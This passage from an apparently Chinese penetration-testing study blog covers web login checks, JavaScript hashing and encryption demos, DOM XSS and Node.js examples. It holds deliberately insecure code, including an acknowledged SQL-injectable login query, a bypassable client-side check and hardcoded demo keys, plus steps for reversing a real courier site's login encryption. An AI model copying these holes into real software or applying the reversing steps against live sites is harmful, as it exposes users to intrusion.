class="string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">url</span>: <span class="string">&#x27;logincheck.php&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">myuser</span>:$(<span class="string">&#x27;.user&#x27;</span>).<span class="title function_">val</span>(),   <span class="comment">// 这里接收的表单值是在input标签中的class值，而不是name或者id值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">mypass</span>:$(<span class="string">&#x27;.pass&#x27;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(res[<span class="string">&#x27;infoCode&#x27;</span>]==<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&#x27;登录成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">//登录成功处理事件，location.href=&#x27;index.php&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&#x27;登录失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端的验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myuser&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mypass&#x27;</span>];</span><br><span class="line"><span class="comment">//真实情况需要在数据库获取</span></span><br><span class="line"><span class="variable">$success</span>=<span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$pass</span>==<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href=&quot;index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);</span><br></pre></td></tr></table></figure><p>注意，如果将 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;script&gt;location.href=&quot;index.php&quot;;&lt;/script&gt;&#x27;; </span><br></pre></td></tr></table></figure><p>这一段写在js里面，会导致安全问题，直接抓返回包将值改为1就可以跳转</p><h2 id="编码加密"><a href="#编码加密" class="headerlink" title="编码加密"></a>编码加密</h2><p>提前分装好对应的js文件，然后调用即可</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/md5.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> str1 = <span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> str_encode = <span class="title function_">md5</span>(str1);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode) </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，js目录下的md5.js为md5加密的规则文件</p><h3 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str1 = <span class="string">&#x27;hello&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str_encode = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA1</span>(str1).<span class="title function_">toString</span>(); </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode)  </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>      </span><br></pre></td></tr></table></figure><h3 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> key = <span class="string">&#x27;key&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> str1 = <span class="string">&#x27;hello&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">HmacSHA256</span>(key, str1);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> str_encode = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">stringify</span>(hash);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode)  <span class="comment">// &#x27;11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位, 长度不一致也没问题</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> message = <span class="string">&quot;hello&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span><br><span class="line"><span class="language-javascript">              &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span><br><span class="line"><span class="language-javascript">             &#125;</span></span><br><span class="line"><span class="language-javascript">          ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt); <span class="comment">// 在弹窗中打印字符串 2vcsEDJv9vAZZLgFLjkZ9A==</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">//解密</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span><br><span class="line"><span class="language-javascript">              &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">          ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// &quot;xiaodisec&quot;</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jsencrypt.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 公钥 私匙是通过公匙计算生成的，不能盲目设置</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> <span class="variable constant_">PUBLIC_KEY</span> = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALyBJ6kZ/VFJYTV3vOC07jqWIqgyvHulv6us/8wzlSBqQ2+eOTX7s5zKfXY40yZWDoCaIGk+tP/sc0D6dQzjaxECAwEAAQ==-----END PUBLIC KEY-----&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//私钥</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> <span class="variable constant_">PRIVATE_KEY</span> = <span class="string">&#x27;-----BEGIN PRIVATE KEY-----MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAvIEnqRn9UUlhNXe84LTuOpYiqDK8e6W/q6z/zDOVIGpDb545NfuznMp9djjTJlYOgJogaT60/+xzQPp1DONrEQIDAQABAkEAu7DFsqQEDDnKJpiwYfUE9ySiIWNTNLJWZDN/Bu2dYIV4DO2A5aHZfMe48rga5BkoWq2LALlY3tqsOFTe3M6yoQIhAOSfSAU3H6jIOnlEiZabUrVGqiFLCb5Ut3Jz9NN+5p59AiEA0xQDMrxWBBJ9BYq6RRY4pXwa/MthX/8Hy+3GnvNw/yUCIG/3Ee578KVYakq5pih8KSVeVjO37C2qj60d3Ok3XPqBAiEAqGPvxTsAuBDz0kcBIPqASGzArumljkrLsoHHkakOfU0CIDuhxKQwHlXFDO79ppYAPcVO3bph672qGD84YUaHF+pQ-----END PRIVATE KEY-----&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//使用公钥加密</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> encrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();<span class="comment">//实例化加密对象</span></span></span><br><span class="line"><span class="language-javascript">        encrypt.<span class="title function_">setPublicKey</span>(<span class="variable constant_">PUBLIC_KEY</span>);<span class="comment">//设置公钥</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> message = <span class="string">&#x27;hello&#x27;</span> <span class="comment">// 需要加密的数据 </span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> encrypted = encrypt.<span class="title function_">encrypt</span>(message);<span class="comment">//对指定数据进行加密</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypted)  <span class="comment">// &#x27;JQ83h8tmJpsSZcb4BJ3eQvuqIAs3ejepcUUnoFhQEvum8fA8bf1Y/fG+DO1bSIVNJF6EOZKe4wa0njv6aOar9w==&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//使用私钥解密</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> decrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>(); <span class="comment">// 创建解密对象</span></span></span><br><span class="line"><span class="language-javascript">        decrypt.<span class="title function_">setPrivateKey</span>(<span class="variable constant_">PRIVATE_KEY</span>); <span class="comment">//设置私钥</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> uncrypted = decrypt.<span class="title function_">decrypt</span>(encrypted); <span class="comment">//解密 &#x27;xiaodisec&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(uncrypted);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Dom树"><a href="#Dom树" class="headerlink" title="Dom树"></a>Dom树</h2><p>dom即文档操作对象，是浏览器提供的一套专门用来操作网页代码内容的功能，实现自主或用户交互动作反馈</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;iii&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ccc&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getValue()&quot;</span>&gt;</span>标题标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getValue</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 以下a，b，c三种写法都是获取对象的，输出结果都是：</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// &lt;h1 id=&quot;iii&quot; class=&quot;ccc&quot; onclick=&quot;getValue()&quot;&gt;标题&lt;/h1&gt;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#iii&quot;</span>)  <span class="comment">//id值前面加#  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> b = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.ccc&quot;</span>)  <span class="comment">//class值前面用.</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> c = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;h1&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c)</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c.<span class="property">innerText</span>)    <span class="comment">//输出结果为标题标题</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c.<span class="property">id</span>)           <span class="comment">//输出结果为iii</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c.<span class="property">className</span>)    <span class="comment">//输出结果为ccc</span></span></span><br><span class="line"><span class="language-javascript">        c.<span class="property">innerHTML</span> = <span class="string">&quot;替换标题&lt;Hr&gt;&quot;</span>  <span class="comment">//可以解析后续代码，输出结果为替换标题且有下划线</span></span></span><br><span class="line"><span class="language-javascript">        c.<span class="property">innerText</span> = <span class="string">&quot;替换标题&lt;Hr&gt;&quot;</span>  <span class="comment">//不可以解析后续代码，输出结果为替换标题&lt;Hr&gt;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 前端代码通过DOM技术来实现代码的更新，如果更新的地方用户可控，就会造成DOM XSS</p><h2 id="逆向调试"><a href="#逆向调试" class="headerlink" title="逆向调试"></a>逆向调试</h2><p>这里基于上述知识做一个简单的调试和思路，更复杂高级的方法会在逆向中详细说明，找个申通快递官网登录示范一下</p><p>1、在密码输入框和登录处右键调试，一般可以看到id值或者name值，然后全局搜索这两个值，一般是一样的，相互结合，然后根据搜索到的地方一个个看，找到加密的地方，如下，先找id值，再找密码加密的地方（手机号是我随便输的，但是要保证正确）</p><p><img src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/image-20240204205144830.png" alt="image-20240204205144830"></p><p><img src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/image-20240204205305796.png" alt="image-20240204205305796"></p><p>2、在加密处下断点，然后点击登录，将加密逻辑复制到控制台，即可输出加密后的结果，然后我们就可以随意去替换明文内容</p><p><img src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/image-20240204205637092.png" alt="image-20240204205637092"></p><p><img src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/image-20240204205726468.png" alt="image-20240204205726468"></p><p>注意：这里一定要下断点才可以去调用，因为它需要在这个环境里面加载这些逻辑，没有走到断点点话就会报错未定义</p><h1 id="JS框架类"><a href="#JS框架类" class="headerlink" title="JS框架类"></a>JS框架类</h1><h2 id="Node-JS"><a href="#Node-JS" class="headerlink" title="Node.JS"></a>Node.JS</h2><p>Node.js是运行在<strong>服务端</strong>的JavaScript，简单理解就是你看到的结果是代码执行后的结果而非js代码</p><p>先在官网安装：<a href="https://nodejs.org/">https://nodejs.org/</a> ，重启电脑使环境变量生效，通过 <strong>npm i</strong> 来安装第三方库</p><p>基本教程可以参考  <a href="https://www.w3cschool.cn/nodejs/">https://www.w3cschool.cn/nodejs/</a></p><h3 id="数据库连接查询"><a href="#数据库连接查询" class="headerlink" title="数据库连接查询"></a>数据库连接查询</h3><p>以下是简单的demo，当然，存在sql注入，只是为了了解一下书写规则</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql=<span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app=<span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> urlencodedParser = bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,urlencodedParser,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;  <span class="comment">// req是发送数据，res是回显数据</span></span><br><span class="line">    <span class="keyword">const</span> u = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">const</span> p = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">    <span class="keyword">var</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">        host     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        user     : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        password : <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        database : <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    connection.<span class="title function_">connect</span>();</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">&#x27;select * from admin where un=&quot;&#x27;</span>+u+<span class="string">&#x27;&quot; and pw=&quot;&#x27;</span>+p+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">    connection.<span class="title function_">query</span>(sql,<span class="keyword">function</span>(<span class="params">error,data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(error)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;database connection failure!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(u==(data[<span class="number">0</span>][<span class="string">&#x27;un&#x27;</span>])&amp;&amp;p==(data[<span class="number">0</span>][<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;welcome to admin&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 当使用get接收数据时，使用req.query来接收数据</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname+<span class="string">&#x27;/&#x27;</span>+<span class="string">&#x27;index.html&#x27;</span>); <span class="comment">// 渲染页面，调用index.html</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;web open success !&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="文件管理-1"><a href="#文件管理-1" class="headerlink" title="文件管理"></a>文件管理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> dir=req.<span class="property">query</span>.<span class="property">dir</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dir);</span><br><span class="line">    <span class="title function_">filemanage</span>(dir);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span 